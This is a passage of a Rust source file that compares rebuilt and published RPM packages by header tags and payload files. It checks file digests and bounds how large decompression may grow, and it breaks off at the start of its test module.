//! Compare RPM packages by header and payload.
//!
//! Header tags are compared one by one, except those derived from the payload
//! (file digests and sizes, payload digests and sizes), which are checked
//! against each package's own payload instead. Payload files are compared file
//! by file with the kit rules of `fsfiles`. The signature header holds only
//! digests and signatures of the header and payload, and is not compared.

use crate::error::Result;
use crate::fsfiles::{self, display, Entry, FileReport, FileTree, FsPath, Kind, Rules, Status};
use flate2::read::GzDecoder;
use liblzma::bufread::XzDecoder;
use liblzma::stream::{Stream, CONCATENATED};
use serde::Serialize;
use sha2::digest::DynDigest;
use sha2::{Digest, Sha256};
use snafu::{ensure_whatever, OptionExt, ResultExt};
use std::borrow::Cow;
use std::collections::{BTreeMap, BTreeSet};
use std::fs::File;
use std::io::{self, BufRead, BufReader, BufWriter, Read, Seek, SeekFrom, Write};
use std::ops::Range;
use std::os::unix::fs::FileExt;
use std::path::Path;

const LEAD_SIZE: usize = 96;
const LEAD_MAGIC: &[u8] = &[0xed, 0xab, 0xee, 0xdb];
const HEADER_MAGIC: &[u8] = &[0x8e, 0xad, 0xe8, 0x01];

/// The limits rpm itself puts on a header.
const MAX_HEADER_ENTRIES: u32 = 0xffff;
const MAX_HEADER_DATA: u32 = 256 << 20;

/// How much larger than the rebuilt payload the published payload may unpack to.
const PAYLOAD_SLACK: u64 = 256 << 20;

/// Most memory the xz and lzma decoders may use, which the stream's dictionary size sets.
const MAX_XZ_MEMORY: u64 = 128 << 20;

/// Longest file name accepted in a payload.
const MAX_CPIO_NAME: u64 = 4096;

/// Longest symlink target accepted in a payload.
const MAX_LINK_TARGET: u64 = 4096;

/// Differing values shown per tag.
const MAX_SHOWN_VALUES: usize = 3;

/// Tag values longer than this are shown by size and digest.
const MAX_SHOWN_VALUE: usize = 512;

/// Region tags only describe the layout of a header.
const REGION_TAGS: std::ops::RangeInclusive<u32> = 61..=63;

const TAG_OLDFILENAMES: u32 = 1027;
const TAG_FILESIZES: u32 = 1028;
const TAG_FILEMODES: u32 = 1030;
const TAG_FILEDIGESTS: u32 = 1035;
const TAG_DIRINDEXES: u32 = 1116;
const TAG_BASENAMES: u32 = 1117;
const TAG_DIRNAMES: u32 = 1118;
const TAG_PAYLOADFORMAT: u32 = 1124;
const TAG_PAYLOADCOMPRESSOR: u32 = 1125;
const TAG_LONGFILESIZES: u32 = 5008;
const TAG_FILEDIGESTALGO: u32 = 5011;

/// Tags derived from the payload: those that change whenever a payload file
/// changes, and the file types libmagic reads from the contents, which include
/// ELF build IDs.
const PAYLOAD_TAGS: &[u32] = &[
    1141, // FILECLASS
    1142, // CLASSDICT
    1009, // SIZE
    TAG_FILESIZES,
    TAG_FILEDIGESTS,
    1046, // ARCHIVESIZE
    TAG_LONGFILESIZES,
    5009, // LONGSIZE
    5092, // PAYLOADDIGEST
    5097, // PAYLOADDIGESTALT
    5112, // PAYLOADSIZE
    5113, // PAYLOADSIZEALT
];

/// Tags holding one value per file.
const FILE_TAGS: &[u32] = &[
    TAG_OLDFILENAMES,
    TAG_FILESIZES,
    TAG_FILEMODES,
    1033, // FILERDEVS
    1034, // FILEMTIMES
    TAG_FILEDIGESTS,
    1036, // FILELINKTOS
    1037, // FILEFLAGS
    1039, // FILEUSERNAME
    1040, // FILEGROUPNAME
    1045, // FILEVERIFYFLAGS
    1095, // FILEDEVICES
    1096, // FILEINODES
    1097, // FILELANGS
    TAG_DIRINDEXES,
    TAG_BASENAMES,
    1140, // FILECOLORS
    1141, // FILECLASS
    1143, // FILEDEPENDSX
    1144, // FILEDEPENDSN
    5010, // FILECAPS
    TAG_LONGFILESIZES,
    5045, // FILENLINKS
    5090, // FILESIGNATURES
];

/// Names of the tags reported most often; others are shown by number.
const TAG_NAMES: &[(u32, &str)] = &[
    (100, "HEADERI18NTABLE"),
    (1000, "NAME"),
    (1001, "VERSION"),
    (1002, "RELEASE"),
    (1003, "EPOCH"),
    (1004, "SUMMARY"),
    (1005, "DESCRIPTION"),
    (1006, "BUILDTIME"),
    (1007, "BUILDHOST"),
    (1010, "DISTRIBUTION"),
    (1011, "VENDOR"),
    (1014, "LICENSE"),
    (1015, "PACKAGER"),
    (1016, "GROUP"),
    (1020, "URL"),
    (1021, "OS"),
    (1022, "ARCH"),
    (1023, "PREIN"),
    (1024, "POSTIN"),
    (1025, "PREUN"),
    (1026, "POSTUN"),
    (TAG_OLDFILENAMES, "OLDFILENAMES"),
    (TAG_FILEMODES, "FILEMODES"),
    (1033, "FILERDEVS"),
    (1034, "FILEMTIMES"),
    (1036, "FILELINKTOS"),
    (1037, "FILEFLAGS"),
    (1039, "FILEUSERNAME"),
    (1040, "FILEGROUPNAME"),
    (1044, "SOURCERPM"),
    (1045, "FILEVERIFYFLAGS"),
    (1047, "PROVIDENAME"),
    (1048, "REQUIREFLAGS"),
    (1049, "REQUIRENAME"),
    (1050, "REQUIREVERSION"),
    (1053, "CONFLICTFLAGS"),
    (1054, "CONFLICTNAME"),
    (1055, "CONFLICTVERSION"),
    (1064, "RPMVERSION"),
    (1065, "TRIGGERSCRIPTS"),
    (1066, "TRIGGERNAME"),
    (1067, "TRIGGERVERSION"),
    (1068, "TRIGGERFLAGS"),
    (1069, "TRIGGERINDEX"),
    (1079, "VERIFYSCRIPT"),
    (1080, "CHANGELOGTIME"),
    (1081, "CHANGELOGNAME"),
    (1082, "CHANGELOGTEXT"),
    (1085, "PREINPROG"),
    (1086, "POSTINPROG"),
    (1087, "PREUNPROG"),
    (1088, "POSTUNPROG"),
    (1090, "OBSOLETENAME"),
    (1095, "FILEDEVICES"),
    (1096, "FILEINODES"),
    (1097, "FILELANGS"),
    (1112, "PROVIDEFLAGS"),
    (1113, "PROVIDEVERSION"),
    (1114, "OBSOLETEFLAGS"),
    (1115, "OBSOLETEVERSION"),
    (TAG_DIRINDEXES, "DIRINDEXES"),
    (TAG_BASENAMES, "BASENAMES"),
    (TAG_DIRNAMES, "DIRNAMES"),
    (1122, "OPTFLAGS"),
    (TAG_PAYLOADFORMAT, "PAYLOADFORMAT"),
    (TAG_PAYLOADCOMPRESSOR, "PAYLOADCOMPRESSOR"),
    (1126, "PAYLOADFLAGS"),
    (1132, "PLATFORM"),
    (1140, "FILECOLORS"),
    (1141, "FILECLASS"),
    (1142, "CLASSDICT"),
    (1143, "FILEDEPENDSX"),
    (1144, "FILEDEPENDSN"),
    (1145, "DEPENDSDICT"),
    (1146, "SOURCEPKGID"),
    (1151, "PRETRANS"),
    (1152, "POSTTRANS"),
    (1153, "PRETRANSPROG"),
    (1154, "POSTTRANSPROG"),
    (5010, "FILECAPS"),
    (TAG_FILEDIGESTALGO, "FILEDIGESTALGO"),
    (5020, "PREINFLAGS"),
    (5021, "POSTINFLAGS"),
    (5022, "PREUNFLAGS"),
    (5023, "POSTUNFLAGS"),
    (5045, "FILENLINKS"),
    (5046, "RECOMMENDNAME"),
    (5049, "SUGGESTNAME"),
    (5052, "SUPPLEMENTNAME"),
    (5055, "ENHANCENAME"),
    (5062, "ENCODING"),
    (5090, "FILESIGNATURES"),
    (5093, "PAYLOADDIGESTALGO"),
];

fn tag_name(tag: u32) -> String {
    TAG_NAMES
        .iter()
        .find(|(t, _)| *t == tag)
        .map_or_else(|| format!("tag {tag}"), |(_, name)| name.to_string())
}

const TYPE_NULL: u32 = 0;
const TYPE_STRING: u32 = 6;
const TYPE_BIN: u32 = 7;
const TYPE_STRING_ARRAY: u32 = 8;
const TYPE_I18NSTRING: u32 = 9;

/// The width of each value of an integer tag type.
fn int_width(kind: u32) -> Option<usize> {
    match kind {
        1 | 2 => Some(1),
        3 => Some(2),
        4 => Some(4),
        5 => Some(8),
        _ => None,
    }
}

/// The value of a header tag: its type and the bytes of the header's data store holding it.
#[derive(Debug, Clone, Copy)]
struct Value<'a> {
    kind: u32,
    data: &'a [u8],
}

/// One value of an array.
#[derive(Debug, PartialEq, Eq)]
enum Item<'a> {
    Int(u64),
    Bytes(&'a [u8]),
}

impl Item<'_> {
    fn describe(&self) -> String {
        match self {
            Item::Int(n) => n.to_string(),
            Item::Bytes(bytes) => describe_bytes(bytes),
        }
    }
}

impl<'a> Value<'a> {
    fn ints(self) -> Option<impl Iterator<Item = u64> + 'a> {
        let width = int_width(self.kind)?;
        Some(
            self.data
                .chunks(width)
                .map(|c| c.iter().fold(0, |v, b| v << 8 | u64::from(*b))),
        )
    }

    fn strings(self) -> Option<impl Iterator<Item = &'a [u8]> + 'a> {
        matches!(self.kind, TYPE_STRING | TYPE_STRING_ARRAY | TYPE_I18NSTRING)
            .then(|| self.data.split(|b| *b == 0).take(self.len()))
    }

    fn len(self) -> usize {
        match self.kind {
            TYPE_NULL => 0,
            TYPE_STRING | TYPE_BIN => 1,
            TYPE_STRING_ARRAY | TYPE_I18NSTRING => self.data.iter().filter(|b| **b == 0).count(),
            kind => self.data.len() / int_width(kind).expect("tag types are checked when read"),
        }
    }

    fn items(self) -> Box<dyn Iterator<Item = Item<'a>> + 'a> {
        if let Some(ints) = self.ints() {
            return Box::new(ints.map(Item::Int));
        }
        if let Some(strings) = self.strings() {
            return Box::new(strings.map(Item::Bytes));
        }
        if self.kind == TYPE_BIN {
            return Box::new(std::iter::once(Item::Bytes(self.data)));
        }
        Box::new(std::iter::empty())
    }

    fn describe(self) -> String {
        let len = self.len();
        if len == 1 {
            return self.items().next().expect("one value").describe();
        }
        let mut hasher = Sha256::new();
        for item in self.items() {
            Digest::update(&mut hasher, item.describe());
            Digest::update(&mut hasher, b"\n");
        }
        format!("{len} values, sha256 {}", hex::encode(hasher.finalize()))
    }
}

/// Show printable text quoted, and anything else or anything long by size and digest.
fn describe_bytes(bytes: &[u8]) -> String {
    let printable = bytes.iter().all(|b| b.is_ascii_graphic() || *b == b' ');
    if printable && bytes.len() <= MAX_SHOWN_VALUE {
        format!("\"{}\"", display(bytes))
    } else {
        format!(
            "{} bytes, sha256 {}",
            bytes.len(),
            hex::encode(Sha256::digest(bytes))
        )
    }
}

/// A header's data store, and the type of each tag and where in the store its value is.
#[derive(Debug)]
struct Header {
    store: Vec<u8>,
    tags: BTreeMap<u32, (u32, Range<usize>)>,
}

impl Header {
    fn get(&self, tag: u32) -> Option<Value<'_>> {
        self.tags.get(&tag).map(|(kind, bytes)| Value {
            kind: *kind,
            data: &self.store[bytes.clone()],
        })
    }

    fn ints(&self, tag: u32) -> Option<Vec<u64>> {
        Some(self.get(tag)?.ints()?.collect())
    }

    fn strings(&self, tag: u32) -> Option<Vec<&[u8]>> {
        Some(self.get(tag)?.strings()?.collect())
    }

    fn first_string(&self, tag: u32) -> Option<&[u8]> {
        self.get(tag)?.strings()?.next()
    }
}

fn be32(bytes: &[u8]) -> u32 {
    u32::from_be_bytes(bytes.try_into().expect("4 bytes"))
}

/// Read a header's intro, returning the sizes of its index and data store.
fn read_intro(reader: &mut impl Read) -> Result<(usize, usize)> {
    let mut intro = [0u8; 16];
    reader
        .read_exact(&mut intro)
        .whatever_context("failed to read header")?;
    ensure_whatever!(intro.starts_with(HEADER_MAGIC), "bad header magic");
    let (count, size) = (be32(&intro[8..12]), be32(&intro[12..16]));
    ensure_whatever!(
        count <= MAX_HEADER_ENTRIES && size <= MAX_HEADER_DATA,
        "header of {count} entries and {size} bytes is too large"
    );
    Ok((count as usize * 16, size as usize))
}

/// Skip the signature header, which is padded to 8 bytes.
fn skip_signature_header(reader: &mut impl Read) -> Result<()> {
    let (index, store) = read_intro(reader)?;
    let len = (index + store).next_multiple_of(8) as u64;
    let skipped = io::copy(&mut reader.by_ref().take(len), &mut io::sink())
        .whatever_context("failed to read header")?;
    ensure_whatever!(skipped == len, "header is truncated");
    Ok(())
}

/// Read the header that follows the signature header.
fn read_header(reader: &mut impl Read) -> Result<Header> {
    let (index_len, store_len) = read_intro(reader)?;
    // Grow the buffers as data is read, rather than allocating the sizes the header claims.
    let mut read = |len: usize| -> Result<Vec<u8>> {
        let mut out = Vec::new();
        reader
            .by_ref()
            .take(len as u64)
            .read_to_end(&mut out)
            .whatever_context("failed to read header")?;
        ensure_whatever!(out.len() == len, "header is truncated");
        Ok(out)
    };
    let index = read(index_len)?;
    let store = read(store_len)?;
    let mut tags = BTreeMap::new();
    // Bytes of the store the entries cover. Entries must not overlap, as in the headers rpm
    // writes.
    let mut covered = 0usize;
    for entry in index.chunks(16) {
        let (tag, kind, offset, count) = (
            be32(&entry[0..4]),
            be32(&entry[4..8]),
            be32(&entry[8..12]),
            be32(&entry[12..16]),
        );
        let bytes = locate(&store, kind, offset, count)
            .with_whatever_context(|_| format!("failed to read {}", tag_name(tag)))?;
        covered = covered.saturating_add(bytes.len());
        ensure_whatever!(
            covered <= store.len(),
            "header entries cover more than its {} bytes of data",
            store.len()
        );
        ensure_whatever!(
            tags.insert(tag, (kind, bytes)).is_none(),
            "{} appears more than once",
            tag_name(tag)
        );
    }
    Ok(Header { store, tags })
}

/// Where in the header's data store the value of a tag of type `kind` is.
fn locate(store: &[u8], kind: u32, offset: u32, count: u32) -> Result<Range<usize>> {
    let start = offset as usize;
    let data = store
        .get(start..)
        .whatever_context("data is outside the header")?;
    let count = count as usize;
    let len = match kind {
        TYPE_NULL => 0,
        TYPE_BIN => count,
        TYPE_STRING | TYPE_STRING_ARRAY | TYPE_I18NSTRING => {
            let strings = if kind == TYPE_STRING { 1 } else { count };
            let mut len = 0;
            for _ in 0..strings {
                let end = data[len..]
                    .iter()
                    .position(|b| *b == 0)
                    .whatever_context("string is not terminated")?;
                len += end + 1;
            }
            len
        }
        kind => {
            let width =
                int_width(kind).with_whatever_context(|| format!("unknown tag type {kind}"))?;
            count
                .checked_mul(width)
                .whatever_context("data is outside the header")?
        }
    };
    ensure_whatever!(len <= data.len(), "data is outside the header");
    Ok(start..start + len)
}

/// Open a package and read its header, leaving the reader at the payload.
fn read_package(path: &Path) -> Result<(Header, BufReader<File>)> {
    let file =
        File::open(path).with_whatever_context(|_| format!("failed to open {}", path.display()))?;
    let mut reader = BufReader::new(file);
    let mut lead = [0u8; LEAD_SIZE];
    reader
        .read_exact(&mut lead)
        .whatever_context("failed to read the package lead")?;
    ensure_whatever!(lead.starts_with(LEAD_MAGIC), "not an RPM package");
    skip_signature_header(&mut reader).whatever_context("failed to read the signature header")?;
    let header = read_header(&mut reader).whatever_context("failed to read the header")?;
    Ok((header, reader))
}

/// The absolute path of each file in the header, in header order.
fn file_paths(header: &Header) -> Result<Vec<FsPath>> {
    if let Some(names) = header.get(TAG_OLDFILENAMES).and_then(Value::strings) {
        return Ok(names.map(<[u8]>::to_vec).collect());
    }
    let Some(basenames) = header.strings(TAG_BASENAMES) else {
        return Ok(Vec::new());
    };
    let dirnames = header
        .strings(TAG_DIRNAMES)
        .whatever_context("header has no DIRNAMES")?;
    let indexes = header
        .ints(TAG_DIRINDEXES)
        .whatever_context("header has no DIRINDEXES")?;
    ensure_whatever!(
        indexes.len() == basenames.len(),
        "header has {} DIRINDEXES for {} BASENAMES",
        indexes.len(),
        basenames.len()
    );
    basenames
        .iter()
        .zip(indexes)
        .map(|(base, index)| {
            let dir = usize::try_from(index)
                .ok()
                .and_then(|i| dirnames.get(i))
                .whatever_context("DIRINDEXES refers past DIRNAMES")?;
            Ok([*dir, *base].concat())
        })
        .collect()
}

/// Describe how each tag differs between the rebuilt and the published header,
/// apart from the tags derived from the payload. Values of tags that hold one
/// value per file are shown with the file's path when both packages hold the
/// same files.
fn compare_headers(
    expected: &Header,
    actual: &Header,
    expected_paths: &[FsPath],
    actual_paths: &[FsPath],
) -> Vec<String> {
    let tags: BTreeSet<u32> = expected
        .tags
        .keys()
        .chain(actual.tags.keys())
        .copied()
        .collect();
    let mut out = Vec::new();
    for tag in tags {
        if REGION_TAGS.contains(&tag) || PAYLOAD_TAGS.contains(&tag) {
            continue;
        }
        let name = tag_name(tag);
        let (e, a) = match (expected.get(tag), actual.get(tag)) {
            (Some(e), Some(a)) if e.kind == a.kind && e.data == a.data => continue,
            (Some(e), Some(a)) => (e, a),
            (Some(_), None) => {
                out.push(format!("{name}: only in the rebuilt package"));
                continue;
            }
            (None, Some(_)) => {
                out.push(format!("{name}: only in the published package"));
                continue;
            }
            (None, None) => unreachable!("tags come from either header"),
        };
        if e.kind != a.kind {
            out.push(format!("{name}: type {} vs {}", e.kind, a.kind));
            continue;
        }
        let len = e.len();
        if e.kind == TYPE_BIN || len != a.len() || len <= 1 {
            out.push(format!("{name}: {} vs {}", e.describe(), a.describe()));
            continue;
        }
        let per_file = FILE_TAGS.contains(&tag)
            && expected_paths == actual_paths
            && len == expected_paths.len();
        let mut differing = 0;
        for (i, (x, y)) in e.items().zip(a.items()).enumerate() {
            if x == y {
                continue;
            }
            differing += 1;
            if differing > MAX_SHOWN_VALUES {
                continue;
            }
            let at = if per_file {
                format!(" of {}", display(&expected_paths[i]))
            } else {
                format!("[{i}]")
            };
            out.push(format!("{name}{at}: {} vs {}", x.describe(), y.describe()));
        }
        if differing > MAX_SHOWN_VALUES {
            out.push(format!(
                "{name}: {} more values differ",
                differing - MAX_SHOWN_VALUES
            ));
        }
    }
    out
}

/// Bounds what a decompressor writes, so that a published payload cannot fill the disk.
struct LimitedWriter<W> {
    inner: W,
    remaining: u64,
}

impl<W: Write> Write for LimitedWriter<W> {
    fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
        if buf.len() as u64 > self.remaining {
            return Err(io::Error::other("payload unpacks to more than the limit"));
        }
        let n = self.inner.write(buf)?;
        self.remaining -= n as u64;
        Ok(n)
    }

    fn flush(&mut self) -> io::Result<()> {
        self.inner.flush()
    }
}

/// Where a file's contents are in an unpacked payload.
#[derive(Debug, Clone, Copy)]
struct Segment {
    offset: u64,
    len: u64,
}

/// Reads a segment of a file, independently of any other reader of the file.
struct SegmentReader<'a> {
    file: &'a File,
    pos: u64,
    end: u64,
}

impl Read for SegmentReader<'_> {
    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        let len = buf.len().min((self.end - self.pos) as usize);
        let n = self.file.read_at(&mut buf[..len], self.pos)?;
        self.pos += n as u64;
        Ok(n)
    }
}

/// A package's payload, decompressed into an unnamed temporary file.
struct Payload {
    file: File,
    len: u64,
    entries: BTreeMap<FsPath, (Segment, Entry)>,
}

fn cpio_field(header: &[u8], index: usize) -> Result<u64> {
    let start = 6 + index * 8;
    std::str::from_utf8(&header[start..start + 8])
        .ok()
        .and_then(|s| u64::from_str_radix(s, 16).ok())
        .whatever_context("bad cpio header")
}

fn kind(mode: u64) -> Result<Kind> {
    Ok(match mode & 0o170000 {
        0o100000 => Kind::File,
        0o040000 => Kind::Directory,
        0o120000 => Kind::Symlink,
        0o020000 => Kind::CharDevice,
        0o060000 => Kind::BlockDevice,
        0o010000 => Kind::Fifo,
        0o140000 => Kind::Socket,
        _ => {
            snafu::whatever!("unknown file type in mode {mode:o}");
        }
    })
}

impl Payload {
    /// Decompress the payload that `reader` is at into a temporary file in
    /// `work_dir`, failing if it unpacks to more than `limit` bytes, and index
    /// its cpio archive.
    fn unpack(
        header: &Header,
        reader: &mut impl BufRead,
        work_dir: &Path,
        limit: u64,
    ) -> Result<Self> {
        let format = header.first_string(TAG_PAYLOADFORMAT);
        ensure_whatever!(
            format.is_none_or(|f| f == b"cpio"),
            "unsupported payload format {}",
            display(format.unwrap_or_default())
        );
        let mut file = tempfile::tempfile_in(work_dir).with_whatever_context(|_| {
            format!("failed to create a file in {}", work_dir.display())
        })?;
        let mut out = LimitedWriter {
            inner: BufWriter::new(&mut file),
            remaining: limit,
        };
        let compressor = header
            .first_string(TAG_PAYLOADCOMPRESSOR)
            .unwrap_or(b"gzip");
        match compressor {
            b"zstd" => {
                let mut decoder =
                    zstd::Decoder::with_buffer(reader).whatever_context("bad zstd payload")?;
                io::copy(&mut decoder, &mut out).map(drop)
            }
            b"gzip" => io::copy(&mut GzDecoder::new(reader), &mut out).map(drop),
            b"xz" | b"lzma" => {
                let stream = if compressor == b"xz" {
                    Stream::new_stream_decoder(MAX_XZ_MEMORY, CONCATENATED)
                } else {
                    Stream::new_lzma_decoder(MAX_XZ_MEMORY)
                }
                .whatever_context("failed to create an xz decoder")?;
                io::copy(&mut XzDecoder::new_stream(reader, stream), &mut out).map(drop)
            }
            other => {
                snafu::whatever!("unsupported payload compressor {}", display(other));
            }
        }
        .whatever_context("failed to decompress the payload")?;
        out.flush()
            .whatever_context("failed to decompress the payload")?;
        drop(out);
        let len = file
            .seek(SeekFrom::End(0))
            .whatever_context("failed to read the payload")?;
        let entries = Self::index(&file, len)?;
        Ok(Self { file, len, entries })
    }

    /// Index the entries of the cpio archive in `file`.
    ///
    /// rpm writes the contents of a hard-linked file once, with its last link,
    /// and installs those for every link, so the other links are given the same
    /// contents. Other links carrying contents fail.
    fn index(file: &File, len: u64) -> Result<BTreeMap<FsPath, (Segment, Entry)>> {
        let mut reader = BufReader::new(file);
        reader
            .seek(SeekFrom::Start(0))
            .whatever_context("failed to read the payload")?;
        let mut pos = 0u64;
        let mut entries = BTreeMap::new();
        let mut links: BTreeMap<u64, Vec<FsPath>> = BTreeMap::new();
        loop {
            let mut header = [0u8; 110];
            reader
                .read_exact(&mut header)
                .whatever_context("payload ends without a cpio trailer")?;
            ensure_whatever!(
                !header.starts_with(b"07070X"),
                "payload is in rpm's stripped cpio format, used for files of 4 GiB or more, \
                 which is not supported"
            );
            ensure_whatever!(
                header.starts_with(b"070701") || header.starts_with(b"070702"),
                "payload is not a cpio archive in the newc format"
            );
            let field = |i| cpio_field(&header, i);
            let (ino, mode, nlink, size) = (field(0)?, field(1)?, field(4)?, field(6)?);
            let (rdev_major, rdev_minor, name_size) = (field(9)?, field(10)?, field(11)?);
            ensure_whatever!(
                (1..=MAX_CPIO_NAME).contains(&name_size),
                "bad cpio file name size {name_size}"
            );
            let mut name = vec![0u8; name_size as usize];
            reader
                .read_exact(&mut name)
                .whatever_context("failed to read the payload")?;
            ensure_whatever!(name.pop() == Some(0), "cpio file name is not terminated");
            pos += 110 + name_size;
            let data = pos.next_multiple_of(4);
            let next = data
                .checked_add(size)
                .filter(|end| *end <= len)
                .whatever_context("cpio entry extends past the payload")?
                .next_multiple_of(4);
            if name == b"TRAILER!!!" {
                break;
            }
            let path = match name.strip_prefix(b".") {
                Some(rest) if rest.is_empty() || rest.starts_with(b"/") => rest.to_vec(),
                _ => [b"/", name.as_slice()].concat(),
            };
            let path = if path.is_empty() { b"/".to_vec() } else { path };
            let segment = Segment {
                offset: data,
                len: size,
            };
            let kind = kind(mode)?;
            let link = if kind == Kind::Symlink {
                ensure_whatever!(size <= MAX_LINK_TARGET, "symlink target is too long");
                let mut target = vec![0u8; size as usize];
                file.read_exact_at(&mut target, data)
                    .whatever_context("failed to read the payload")?;
                Some(target)
            } else {
                None
            };
            let device = matches!(kind, Kind::CharDevice | Kind::BlockDevice)
                .then_some((rdev_major as u32, rdev_minor as u32));
            // Ownership is compared by name, in the header.
            let entry = Entry {
                kind,
                mode: (mode & 0o7777) as u32,
                uid: 0,
                gid: 0,
                link,
                xattrs: BTreeMap::new(),
                size,
                device,
            };
            if kind == Kind::File && nlink > 1 {
                links.entry(ino).or_default().push(path.clone());
            }
            fsfiles::insert_unique(&mut entries, path, (segment, entry))?;
            reader
                .seek_relative((next - pos) as i64)
                .whatever_context("failed to read the payload")?;
            pos = next;
        }
        for paths in links.values() {
            let (last, others) = paths.split_last().expect("links have a path");
            if let Some(path) = others.iter().find(|p| entries[*p].0.len > 0) {
                snafu::whatever!(
                    "hard link {} has contents, but only its last link {} should",
                    display(path),
                    display(last)
                );
            }
            let contents = entries[last].0;
            for path in others {
                let (segment, entry) = entries.get_mut(path).expect("indexed above");
                *segment = contents;
                entry.size = contents.len;
            }
        }
        Ok(entries)
    }

    /// Check each regular file in the payload against the size and digest the
    /// header records for it, and that the header lists every entry.
    fn check_header(
        &self,
        header: &Header,
        paths: &[FsPath],
        side: &str,
    ) -> Result<Vec<FileReport>> {
        let digests = header.strings(TAG_FILEDIGESTS).unwrap_or_default();
        let sizes = header
            .ints(TAG_LONGFILESIZES)
            .or_else(|| header.ints(TAG_FILESIZES))
            .unwrap_or_default();
        let algorithm = header
            .get(TAG_FILEDIGESTALGO)
            .and_then(Value::ints)
            .and_then(|mut v| v.next())
            .unwrap_or(1);
        let new_hasher = || -> Option<Box<dyn DynDigest>> {
            match algorithm {
                8 => Some(Box::new(Sha256::new())),
                9 => Some(Box::new(sha2::Sha384::new())),
                10 => Some(Box::new(sha2::Sha512::new())),
                _ => None,
            }
        };
        let mut reports = Vec::new();
        let mismatch = |path: &[u8], detail: String| FileReport {
            path: display(path),
            status: Status::Mismatch,
            detail,
            root_role: None,
        };
        let listed: BTreeMap<&[u8], usize> = paths
            .iter()
            .enumerate()
            .map(|(i, p)| (p.as_slice(), i))
            .collect();
        let mut buf = vec![0u8; 1 << 20];
        for (path, (segment, entry)) in &self.entries {
            let Some(&index) = listed.get(path.as_slice()) else {
                reports.push(mismatch(
                    path,
                    format!("in the {side} payload but not in its header"),
                ));
                continue;
            };
            if entry.kind != Kind::File {
                continue;
            }
            if sizes.get(index) != Some(&segment.len) {
                let recorded = sizes.get(index).map_or("no".to_string(), u64::to_string);
                reports.push(mismatch(
                    path,
                    format!(
                        "{} bytes in the {side} payload, but its header records {recorded} bytes",
                        segment.len
                    ),
                ));
                continue;
            }
            let Some(mut hasher) = new_hasher() else {
                reports.push(mismatch(
                    path,
                    format!(
                        "the {side} header uses file digest algorithm {algorithm}, which cannot \
                         be checked"
                    ),
                ));
                break;
            };
            let mut reader = self.open(segment)?;
            loop {
                let n = reader
                    .read(&mut buf)
                    .whatever_context("failed to read the payload")?;
                if n == 0 {
                    break;
                }
                hasher.update(&buf[..n]);
            }
            let digest = hex::encode(hasher.finalize());
            let recorded = digests.get(index).copied().unwrap_or_default();
            if digest.as_bytes() != recorded {
                reports.push(mismatch(
                    path,
                    format!(
                        "digest {digest} in the {side} payload, but its header records {}",
                        describe_bytes(recorded)
                    ),
                ));
            }
        }
        Ok(reports)
    }
}

impl FileTree for Payload {
    type Handle = Segment;

    fn entries(&self) -> Result<Cow<'_, BTreeMap<FsPath, (Segment, Entry)>>> {
        Ok(Cow::Borrowed(&self.entries))
    }

    fn open(&self, segment: &Segment) -> Result<Box<dyn Read + '_>> {
        Ok(Box::new(SegmentReader {
            file: &self.file,
            pos: segment.offset,
            end: segment.offset + segment.len,
        }))
    }
}

/// The result of comparing a rebuilt package against a published one.
#[derive(Debug, Clone, Serialize)]
pub struct PackageReport {
    pub status: Status,
    pub detail: String,
    /// How the headers differ, apart from the tags derived from the payload.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub header: Vec<String>,
    /// Payload files that differ, and files that do not match their header.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub files: Vec<FileReport>,
}

/// Compare a rebuilt package against a published one, unpacking their
/// payloads into `work_dir`. A package that cannot be read fails verification.
pub fn compare(expected: &Path, actual: &Path, work_dir: &Path) -> PackageReport {
    compare_packages(expected, actual, work_dir).unwrap_or_else(|e| PackageReport {
        status: Status::Mismatch,
        detail: format!(
            "the packages could not be compared: {}",
            snafu::Report::from_error(e)
        ),
        header: Vec::new(),
        files: Vec::new(),
    })
}

fn compare_packages(expected: &Path, actual: &Path, work_dir: &Path) -> Result<PackageReport> {
    let (expected_header, mut expected_reader) =
        read_package(expected).with_whatever_context(|_| format!("{}", expected.display()))?;
    let (actual_header, mut actual_reader) =
        read_package(actual).with_whatever_context(|_| format!("{}", actual.display()))?;
    let expected_paths = file_paths(&expected_header)?;
    let actual_paths = file_paths(&actual_header)?;
    let header = compare_headers(
        &expected_header,
        &actual_header,
        &expected_paths,
        &actual_paths,
    );

    let expected_payload =
        Payload::unpack(&expected_header, &mut expected_reader, work_dir, u64::MAX)
            .with_whatever_context(|_| format!("{}", expected.display()))?;
    let limit = expected_payload.len.saturating_add(PAYLOAD_SLACK);
    let actual_payload = Payload::unpack(&actual_header, &mut actual_reader, work_dir, limit)
        .with_whatever_context(|_| format!("{}", actual.display()))?;
    let mut files = fsfiles::compare_trees(&expected_payload, &actual_payload, Rules::Kit, limit)?;
    files.extend(expected_payload.check_header(&expected_header, &expected_paths, "rebuilt")?);
    files.extend(actual_payload.check_header(&actual_header, &actual_paths, "published")?);
    files.sort_by(|a, b| a.path.cmp(&b.path));

    let count = |status| files.iter().filter(|f| f.status == status).count();
    let (mismatches, warnings) = (count(Status::Mismatch), count(Status::Warning));
    let (status, detail) = if !header.is_empty() || mismatches > 0 {
        let mut parts = Vec::new();
        if !header.is_empty() {
            parts.push("the headers differ".to_string());
        }
        if mismatches > 0 {
            parts.push(format!(
                "{mismatches} of {} differing files differ beyond kernel module signatures and \
                 Go build IDs",
                files.len()
            ));
        }
        (Status::Mismatch, parts.join("; "))
    } else if warnings > 0 {
        (
            Status::Warning,
            format!(
                "files differ only in kernel module signatures, Go build IDs and in the kernel \
                 image or certificate built with the module signing key; {} differing files listed",
                files.len()
            ),
        )
    } else if !files.is_empty() {
        (
            Status::ExpectedDifference,
            format!(
                "files differ only in kernel module signatures and Go build IDs; {} differing \
                 files listed",
                files.len()
            ),
        )
    } else {
        (
            Status::Mismatch,
            "the packages differ, but their headers and payload files are identical; the \
             difference is in what is not compared (the signature header, or how the payload \
             is compressed)"
                .to_string(),
        )
    };
    Ok(PackageReport {
        status,
        detail,
        header,
        files,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::kmod::tests::sign;
    use tempfile::TempDir;

    /// A file in a test package: path, mode and contents.
    type FileSpec<'a> = (&'a str, u32, &'a [u8]);

    fn header(tags: &[(u32, u32, Vec<u8>, u32)]) -> Vec<u8> {
        let mut index = Vec::new();
        let mut store = Vec::new();
        for (tag, kind, data, count) in tags {
            let align = match kind {
                3 => 2,
                4 => 4,
